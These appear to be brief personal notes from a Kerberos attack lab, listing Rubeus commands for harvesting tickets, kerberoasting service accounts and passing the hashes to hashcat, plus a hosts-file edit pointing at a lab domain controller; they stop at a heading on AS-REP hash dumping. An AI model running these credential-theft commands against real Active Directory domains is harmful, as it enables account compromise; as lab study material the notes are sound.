

Harvesting Tickets w/ Rubeus
> Rubeus.exe harvest /interval:30

Brute-Forcing / Password-Spraying w/ Rubeus
>echo 10.10.190.126 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

This added the IP and controller.local tot he hosts file

> Rubeus.exe kerberoast
- this dumps the kerberos hash of any kerberoastable users
- transfer hash to .txt file and use hashcat

Dumping KRBASREP5 Hashes w/ Rubeus